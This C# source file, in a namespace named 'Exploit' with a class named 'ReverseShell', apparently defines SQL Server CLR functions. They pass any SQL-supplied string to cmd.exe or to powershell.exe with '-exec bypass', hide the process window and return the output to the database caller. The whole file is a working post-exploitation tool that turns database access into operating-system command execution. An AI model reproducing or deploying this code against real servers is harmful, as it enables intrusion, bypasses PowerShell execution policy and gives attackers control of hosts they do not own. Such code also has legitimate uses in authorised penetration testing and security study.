using System;
using System.Text;
using System.Data.SqlTypes;
using System.Diagnostics;

namespace Exploit
{
    public class ReverseShell
    {
        internal class Command
        {
            public string File;
            public string Arguments;
            public string CmdString;
            public Command (string File, string Arguments, string CmdString)
            {
                this.File = File;
                this.Arguments = Arguments;
                this.CmdString = CmdString;
            }
        }
        internal class Result
        {
            public string stdout;
            public string stderr;
            public Result(string strout, string strerr)
            {
                Encoding ascii = Encoding.UTF8;
                this.stdout = ascii.GetString(ascii.GetBytes(strout));
                this.stderr = ascii.GetString(ascii.GetBytes(strerr));
            }
            public SqlString toSqlString()
            {
                if (this.stderr.Length == 0) return new SqlString(this.stdout);
                if (this.stdout.Length == 0) return new SqlString(this.stderr);
                return new SqlString(this.stderr + "\n" + this.stdout);
            }
        }
        private static string ReadToEnd(System.IO.StreamReader reader)
        {
            string line;
            StringBuilder data = new StringBuilder();
            while ((line = reader.ReadLine()) != null)
            {
                Debug.WriteLine(line);
                if (line == Environment.CurrentDirectory + ">exit") continue;
                if (line == "PS " + Environment.CurrentDirectory + "> exit") continue;
                data.AppendLine(line);
            }
            return data.ToString();
        }
        private static Result Execute(Command cmd)
        {
            StringBuilder input = new StringBuilder();
            Process p = new Process();
            p.StartInfo.FileName = cmd.File;
            p.StartInfo.Arguments = cmd.Arguments;
            p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();
            p.StandardInput.WriteLine(cmd.CmdString);
            p.StandardInput.WriteLine("exit");
            p.StandardInput.Flush();

            return new Result(
                ReadToEnd(p.StandardOutput),
                ReadToEnd(p.StandardError)
            );
        }
        public static SqlString Cmd (SqlString script)
        {
            if (script.IsNull) return script;
            try
            {
                return Execute(new Command("cmd.exe", "", script.Value)).toSqlString();
            }
            catch (Exception e)
            {
                return new SqlString(e.Message);
            }
        }
        public static SqlString Powershell(SqlString script)
        {
            if (script.IsNull) return script;
            try
            {
                return Execute(new Command("powershell.exe", "-exec bypass", script.Value)).toSqlString();
            }
            catch (Exception e)
            {
                return new SqlString(e.Message);
            }
        }
    }
}